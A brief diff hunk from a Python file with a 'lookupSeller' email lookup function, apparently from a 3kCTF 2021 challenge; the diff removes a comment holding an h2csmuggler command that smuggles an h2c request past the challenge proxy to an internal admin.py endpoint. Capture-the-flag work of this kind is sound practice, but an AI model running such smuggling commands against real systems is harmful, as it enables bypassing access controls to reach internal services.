@@ -50,9 +50,3 @@ def lookupSeller(emailAddr):
 		return emailAddr+' found'
 	return 'not found'
 
-
-"""
-
-
-python3 h2csmuggler.py -x https://pawnshop.2021.3k.ctf.to:4443/backend/  -XPOST -d "action=lookup&mail=jmfffc@pawnshop.2021.3k.ctf.t" http://172.30.0.6:8080/admin.py
-"""
